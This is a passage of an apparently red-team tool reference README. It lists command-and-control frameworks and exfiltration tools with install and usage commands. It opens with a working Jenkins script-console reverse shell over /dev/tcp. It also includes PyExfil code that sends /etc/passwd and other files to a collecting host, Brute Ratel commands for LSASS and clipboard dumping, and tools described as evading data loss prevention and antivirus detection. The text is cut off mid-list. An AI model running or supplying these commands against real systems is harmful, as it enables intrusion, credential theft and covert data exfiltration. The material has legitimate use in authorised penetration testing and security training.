href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;Jenkins reverse shell&lt;/h3&gt; &#xA;&lt;p&gt;If you gain access to a jenkins script console you can use this to gain a reverse shell on the node.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-jenkins&#34;&gt;r = Runtime.getRuntime()&#xA;p = r.exec([&#34;/bin/bash&#34;,&#34;-c&#34;,&#34;exec 5&amp;lt;&amp;gt;/dev/tcp/IP_ADDRESS/PORT;cat &amp;lt;&amp;amp;5 | while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&#34;] as String[])&#xA;p.waitFor()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;Collection&lt;/h1&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/BloodHoundAD/BloodHound&#34;&gt;BloodHound&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;An application used to visualize active directory environments. A quick way to visualise attack paths and understand victims&#39; active directory properties.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt; &lt;a href=&#34;https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/&#34;&gt;PenTestPartners Walkthrough&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Custom Queries:&lt;/strong&gt; &lt;a href=&#34;https://github.com/CompassSecurity/BloodHoundQueries&#34;&gt;CompassSecurity BloodHoundQueries&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/206549387-a63e5f0e-aa75-47f6-b51a-942434648ee2.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Command and Control&lt;/h1&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/HavocFramework/Havoc&#34;&gt;Havoc&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Havoc is a modern and malleable post-exploitation command and control framework, created by &lt;a href=&#34;https://twitter.com/C5pider&#34;&gt;@C5pider&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Features include: Sleep Obfuscation, x64 return address spoofing, Indirect Syscalls for Nt* APIs&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Pre-requisites:&lt;/strong&gt; (Ubuntu 20.04 / 22.04)&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo apt install build-essential&#xA;sudo add-apt-repository ppa:deadsnakes/ppa&#xA;sudo apt update&#xA;sudo apt install python3.10 python3.10-dev&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Build + Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/HavocFramework/Havoc.git&#xA;cd Havoc/Client&#xA;make &#xA;./Havoc &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Pre-requisites:&lt;/strong&gt; (Ubuntu 20.04 / 22.04)&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cd Havoc/Teamserver&#xA;go mod download golang.org/x/sys  &#xA;go mod download github.com/ugorji/go&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Build + Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cd Teamserver&#xA;./Install.sh&#xA;make&#xA;./teamserver -h&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Run the teamserver&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo ./teamserver server --profile ./profiles/havoc.yaotl -v --debug&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;em&gt;Full install, build and run instructions on the &lt;a href=&#34;https://github.com/HavocFramework/Havoc/raw/main/WIKI.MD&#34;&gt;wiki&lt;/a&gt;&lt;/em&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/206025215-9c7093e5-b45a-4755-81e6-9e2a52a1f455.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/cobbr/Covenant&#34;&gt;Covenant&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Covenant is a .NET command and control framework, it has a web interface that allows for multi-user collaboration.&lt;/p&gt; &#xA;&lt;p&gt;It can be used to remotely control compromised systems and perform a variety of different tasks, including executing arbitrary code, capturing keystrokes, exfiltrating data, and more.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (Dotnet Core)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;You can download dotnet core for your platform from &lt;a href=&#34;https://dotnet.microsoft.com/download/dotnet-core/3.1&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; &lt;em&gt;After starting Covenant, you must register an initial user through the web interface. Navigating to the web interface will allow you to register the initial user&lt;/em&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone --recurse-submodules https://github.com/cobbr/Covenant&#xA;cd Covenant/Covenant&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage: (Dotnet Core)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;~/Covenant/Covenant &amp;gt; dotnet run&#xA;warn: Microsoft.EntityFrameworkCore.Model.Validation[10400]&#xA;      Sensitive data logging is enabled. Log entries and exception messages may include sensitive application data, this mode should only be enabled during development.&#xA;WARNING: Running Covenant non-elevated. You may not have permission to start Listeners on low-numbered ports. Consider running Covenant elevated.&#xA;Covenant has started! Navigate to https://127.0.0.1:7443 in a browser&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (Docker)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Build the docker image:&#xA;git clone --recurse-submodules https://github.com/cobbr/Covenant&#xA;cd Covenant/Covenant&#xA;~/Covenant/Covenant &amp;gt; docker build -t covenant .&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage: (Docker)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Run Covenant within the Docker container&#xA;~/Covenant/Covenant &amp;gt; docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v &amp;lt;/absolute/path/to/Covenant/Covenant/Data&amp;gt;:/app/Data covenant&#xA;&#xA;# Stop the container&#xA;~/Covenant/Covenant &amp;gt; docker stop covenant&#xA;&#xA;# Restart Covenant interactively&#xA;~/Covenant/Covenant &amp;gt; docker start covenant -ai&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Full installation and startup instructions can be found on the wiki &lt;a href=&#34;https://github.com/cobbr/Covenant/wiki/Installation-And-Startup&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/210168138-58473fc0-4361-41ec-9439-2f2fcb159520.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Image from &lt;a href=&#34;https://github.com/cobbr/Covenant&#34;&gt;https://github.com/cobbr/Covenant&lt;/a&gt;&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/Ne0nd0g/merlin&#34;&gt;Merlin&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Merlin is an open-source post-exploitation framework that is designed to be used after a initial compromise of a system.&lt;/p&gt; &#xA;&lt;p&gt;It is written in Python and can be used to perform a variety of different tasks, such as executing arbitrary code, moving laterally through a network, and exfiltrating data.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Download the latest compiled version of Merlin Server from the &lt;a href=&#34;https://github.com/Ne0nd0g/merlin/releases&#34;&gt;releases&lt;/a&gt; section&lt;/li&gt; &#xA; &lt;li&gt;Extract the files with 7zip using the x function The password is: merlin&lt;/li&gt; &#xA; &lt;li&gt;Start Merlin&lt;/li&gt; &#xA; &lt;li&gt;Configure a &lt;a href=&#34;https://merlin-c2.readthedocs.io/en/latest/server/menu/listeners.html&#34;&gt;listener&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Deploy an agent. See &lt;a href=&#34;https://merlin-c2.readthedocs.io/en/latest/quickStart/agent.html&#34;&gt;Agent Execution Quick Start Guide&lt;/a&gt; for examples&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mkdir /opt/merlin;cd /opt/merlin&#xA;wget https://github.com/Ne0nd0g/merlin/releases/latest/download/merlinServer-Linux-x64.7z&#xA;7z x merlinServer-Linux-x64.7z&#xA;sudo ./merlinServer-Linux-x64&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Ensure the Merlin server is running with a configured listener&lt;/li&gt; &#xA; &lt;li&gt;Download and deploy an agent to the victim&lt;/li&gt; &#xA; &lt;li&gt;Execute agent&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;For detailed usage information see the official Merlin &lt;a href=&#34;https://merlin-c2.readthedocs.io/en/latest/server/menu/main.html&#34;&gt;wiki&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/210168329-57c77e4f-213c-4402-8dd8-70ac3bcabcfe.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Image from &lt;a href=&#34;https://www.foregenix.com/blog/a-first-look-at-todays-command-and-control-frameworks&#34;&gt;https://www.foregenix.com/blog/a-first-look-at-todays-command-and-control-frameworks&lt;/a&gt;&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/rapid7/metasploit-framework&#34;&gt;Metasploit Framework&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Metasploit is an open-source framework for developing, testing, and using exploit code.&lt;/p&gt; &#xA;&lt;p&gt;The Metasploit framework includes a large number of pre-built exploits and payloads, as well as a fully-featured integrated development environment (IDE) for creating and testing custom exploits.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (Installer)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall &amp;amp;&amp;amp; \&#xA;  chmod 755 msfinstall &amp;amp;&amp;amp; \&#xA;  ./msfinstall&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;/opt/metasploit-framework/bin/msfconsole&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Full installation instructions can be found on the official &lt;a href=&#34;https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html&#34;&gt;wiki&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.rapid7.com/blog/tag/metasploit/&#34;&gt;Rapid7 Metasploit blogs&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://cdn.comparitech.com/wp-content/uploads/2019/06/Metasploit-Cheat-Sheet.webp&#34;&gt;Cheat sheet graphic&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/security-cheatsheet/metasploit-cheat-sheet&#34;&gt;Nice command list&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/210168463-f1ac1edb-2f0e-4008-a8ba-308f3a741a9e.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Image used from &lt;a href=&#34;https://goacademy.io/how-to-install-metasploit-on-kali-linux/&#34;&gt;https://goacademy.io/how-to-install-metasploit-on-kali-linux/&lt;/a&gt;&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/n1nj4sec/pupy&#34;&gt;Pupy&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Pupy is an opensource, cross-platform (Windows, Linux, OSX, Android) C2 and post-exploitation framework written in python and C.&lt;/p&gt; &#xA;&lt;p&gt;It allows an attacker to remotely control a victim&#39;s computer and execute various actions, such as command execution, key logging, and taking screen shots.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (Git)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo apt install git libssl1.0-dev libffi-dev python-dev python-pip build-essential swig tcpdump python-virtualenv&#xA;git clone --recursive https://github.com/n1nj4sec/pupy&#xA;cd pupy&#xA;python create-workspace.py -DG pupyw&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Roll fix to fix the error:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo pip2 install rpyc==3.4.4&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Start:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export PATH=$PATH:~/.local/bin; pupysh&#xA;pupyws/bin/pupysh&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;em&gt;Git install instructions used from &lt;a href=&#34;https://kalitut.com/how-to-install-pupy/&#34;&gt;here&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (Docker)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;For detailed docker and pupy installation instructions see the &lt;a href=&#34;https://github.com/n1nj4sec/pupy/wiki/Installation&#34;&gt;wiki&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Get help page for any builtin commands with -h&#xA;&amp;gt;&amp;gt; sessions -h&#xA;&amp;gt;&amp;gt; jobs -h&#xA;&amp;gt;&amp;gt; run -h&#xA;&#xA;# Interact with session 1&#xA;&amp;gt;&amp;gt; sessions -i 1&#xA;&#xA;# Run local command &#39;ls&#39;&#xA;&amp;gt;&amp;gt; !ls&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Full usage information can be found on the &lt;a href=&#34;https://github.com/n1nj4sec/pupy/wiki/Basic-Usage&#34;&gt;wiki&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The wiki contains good &lt;a href=&#34;https://github.com/n1nj4sec/pupy/wiki/Post-Exploitation&#34;&gt;post exploitation information&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/210181480-d1ad1bd8-fa8d-4014-842c-3efbb35b2644.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Image used from &lt;a href=&#34;https://github.com/n1nj4sec/pupy/wiki/Screenshots&#34;&gt;https://github.com/n1nj4sec/pupy/wiki/Screenshots&lt;/a&gt;&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://bruteratel.com/&#34;&gt;Brute Ratel&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;BruteRatel is a great command and control (C4) framework created by &lt;a href=&#34;https://twitter.com/NinjaParanoid&#34;&gt;@NinjaParanoid&lt;/a&gt;. The framework consists of a client component &#39;badger&#39; that is installed on the compromised system, and a server component &#39;commander&#39; that is run by the red team.&lt;/p&gt; &#xA;&lt;p&gt;The client and server communicate with each other using various communication channels, such as HTTP, DNS, or TCP, and can be configured to use different encoding and encryption methods to evade detection.&lt;/p&gt; &#xA;&lt;p&gt;Some nice features:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;DNS Over HTTPS&lt;/li&gt; &#xA; &lt;li&gt;Indirect Syscalls&lt;/li&gt; &#xA; &lt;li&gt;Built-in Debugger To Detect EDR Userland Hooks&lt;/li&gt; &#xA; &lt;li&gt;MITRE graph intergration&lt;/li&gt; &#xA; &lt;li&gt;Adversary TTP automation&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;To legally get access to the framework you will need to buy a licence (1 Year $2500 per user). See the &lt;a href=&#34;https://bruteratel.com/pricing/&#34;&gt;pricing page&lt;/a&gt; for more information.&lt;/p&gt; &#xA;&lt;p&gt;After purchase you can download the framework from &lt;a href=&#34;https://bruteratel.com/tabs/download/&#34;&gt;here&lt;/a&gt; with your Activation Key and License User ID.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Loads a powershell script to memory which can be Invoked using psreflect&#xA;psimport&#xA;&#xA;# Locks keyboard and mouse hardware input. Use â€˜unlock_inputâ€™ command to unlock&#xA;lock_input&#xA;&#xA;# Dumps user clipboard&#xA;dumpclip&#xA;&#xA;# Enumerates basic domain information&#xA;dcenum&#xA;&#xA;# Elevates user privileges to SYSTEM (Requires admin rights)&#xA;get_system&#xA;&#xA;# Takes a screenshot of current desktop and stores it on the server&#xA;screenshot&#xA;&#xA;# Dumps LSASS to C:\Windows\Memory.DMP using the PssCaptureSnapshot technique&#xA;shadowclone&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Full commander terminal usage information can be found &lt;a href=&#34;https://bruteratel.com/tabs/badger/badgers/&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/210181655-74201cad-a782-43ed-97d3-f4c0926d46c3.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Image used from &lt;a href=&#34;https://bruteratel.com/&#34;&gt;https://bruteratel.com/&lt;/a&gt;&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Exfiltration&lt;/h1&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/iagox86/dnscat2&#34;&gt;Dnscat2&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;A tool for establishing C2 connections via DNS, even if the attacker and victim machines are behind a firewall / network address translation (NAT).&lt;/p&gt; &#xA;&lt;p&gt;The tool is designed to be stealthy and difficult to detect, as it uses legitimate DNS traffic to transmit data.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (Compile - Server)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/iagox86/dnscat2.git&#xA;cd dnscat2/server/&#xA;gem install bundler&#xA;bundle install&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (Compile - Client)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/iagox86/dnscat2.git&#xA;cd dnscat2/client/&#xA;make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Full installation information can be found in the &lt;a href=&#34;https://github.com/iagox86/dnscat2#compiling&#34;&gt;Installation Section&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage: (Server)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Establish the server&#xA;ruby ./dnscat2.rb DOMAIN.COM&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage: (Client)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Establish the client with authoritative domain&#xA;./dnscat2 DOMAIN.COM&#xA;&#xA;# Establish the client without authoritative domain&#xA;./dnscat2 --dns host=0.0.0.0,port=0000&#xA;&#xA;# Ping the server from the client&#xA;./dnscat --ping DOMAIN.COM&#xA;&#xA;# Ping the server from the client, with custom dns resolver ip&#xA;./dnscat --dns server=0.0.0.0,domain=DOMAIN.COM --ping&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage: (Tunnels)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# (After establishing the client) You can open a new tunnelled port&#xA;listen [lhost:]lport rhost:rport&#xA;&#xA;# Forward ssh connections through the dnscat2 client to an internal device&#xA;listen 127.0.0.1:2222 10.10.10.10:22&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Full usage information can be found in the &lt;a href=&#34;https://github.com/iagox86/dnscat2#usage&#34;&gt;Usage Section&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/210116521-0ef905ec-cc14-4cdc-9831-46bbded8c6af.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/TryCatchHCF/Cloakify&#34;&gt;Cloakify&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;When exfiltrating victim files, DLP (Data Loss Prevention) solutions will typically trigger on strings within these files. Cloakify reduces this risk by transforming the data.&lt;/p&gt; &#xA;&lt;p&gt;Cloakify transforms any filetype (e.g. .zip, .exe, .xls, etc.) into a list of harmless-looking strings. This lets you hide the file in plain sight, and transfer the file without triggering alerts.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; You can make your own ciphers, see &lt;a href=&#34;https://github.com/TryCatchHCF/Cloakify#create-your-own-cipers&#34;&gt;here&lt;/a&gt; for more info.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/TryCatchHCF/Cloakify&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Cloakify some text&#xA;python3 cloakify.py TEXT.txt ciphers/desserts.ciph &amp;gt; TEXT.cloaked&#xA;&#xA;# De-Cloakify the text&#xA;python3 decloakify.py TEXT.cloaked ciphers/desserts.ciph&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/210117067-4611a42a-2ac7-44af-8aee-2e448c05909b.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/210116996-8ec36a12-8eef-44e9-924a-ad179e599910.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/ytisf/PyExfil&#34;&gt;PyExfil&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;&#34;An Alpha-Alpha stage package, not yet tested (and will appreciate any feedbacks and commits) designed to show several techniques of data exfiltration is real-world scenarios.&#34;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://www.github.com/ytisf/PyExfil;cd PyExfil;pip install -r requirements.txt;pip install py2exe;pip setup.py install&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt; (Full Usage &lt;a href=&#34;https://github.com/ytisf/PyExfil/raw/master/USAGE.md&#34;&gt;here&lt;/a&gt;)&lt;/p&gt; &#xA;&lt;h4&gt;HTTP Cookies&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pyexfil.network.HTTP_Cookies.http_exfiltration import send_file, listen&#xA;&#xA;# For Client (exfil)&#xA;send_file(addr=&#39;http://www.morirt.com&#39;, file_path=FILE_TO_EXFIL)&#xA;&#xA;# For Server (collecting)&#xA;listen(local_addr=&#39;127.0.0.1&#39;, local_port=80)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;ICMP Echo 8&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pyexfil.network.ICMP.icmp_exfiltration import send_file, init_listener&#xA;&#xA;# For Client (exfil)&#xA;ip_addr = &#34;127.0.0.1&#34;&#xA;send_file(ip_addr, src_ip_addr=&#34;127.0.0.1&#34;, file_path=&#34;&#34;, max_packetsize=512, SLEEP=0.1)&#xA;&#xA;# For Server (collecting)&#xA;init_listener(ip_addr, saving_location=&#34;/tmp/&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;NTP Request&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pyexfil.network.NTP.ntp_exfil import exfiltrate, ntp_listen, NTP_UDP_PORT&#xA;&#xA;# For Client (exfil)&#xA;ip_addr = &#34;127.0.0.1&#34;&#xA;exfiltrate(&#34;/etc/passwd&#34;, ip_addr, time_delay=0.1)&#xA;&#xA;# For Server (collecting)&#xA;ntp_listener(ip=&#34;0.0.0.0&#34;, port=NTP_UDP_PORT)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/206573575-e90384c4-4a39-4f3c-96ec-face1f191808.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/Viralmaniar/Powershell-RAT&#34;&gt;Powershell RAT&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Python based backdoor that uses Gmail to exfiltrate data as an e-mail attachment. It tracks the user activity using screen capture and sends the information to an attacker as an e-mail attachment.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/Viralmaniar/Powershell-RAT&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt; (Full Usage &lt;a href=&#34;https://github.com/Viralmaniar/Powershell-RAT/raw/master/README.md&#34;&gt;here&lt;/a&gt;)&lt;/p&gt; &#xA;&lt;h4&gt;Setup&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Throwaway Gmail address&lt;/li&gt; &#xA; &lt;li&gt;Enable &#34;Allow less secure apps&#34; 